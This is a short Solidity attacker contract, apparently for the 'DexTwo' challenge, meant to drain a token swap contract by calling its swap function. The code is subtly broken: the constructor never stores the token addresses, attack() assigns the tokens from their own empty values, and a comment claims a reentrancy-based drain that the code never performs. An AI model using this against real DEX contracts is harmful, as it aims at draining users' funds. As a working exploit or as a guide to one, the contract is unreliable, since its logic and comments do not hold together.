pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IDexTwo {
    function swap(address from, address to, uint256 amount) external;
}

contract DexTwoAttacker {
    address private owner;
    IDexTwo private immutable dex;
    IERC20 public token1;
    IERC20 public token2;
    uint256 public calls;

    constructor(address _dex, address _token1, address _token2) {
        dex = IDexTwo(_dex);
        owner = msg.sender;
    }

    function attack() external {
        token1 = IERC20(token1);
        token2 = IERC20(token2);
        dex.swap(address(token1), address(token2), 1);
        dex.swap(address(token2), address(token1), 1);
        // Drain via repeated skims (requires reentrancy)
    }

    function isOwner() public view returns (bool) {
        return owner == msg.sender;
    }
}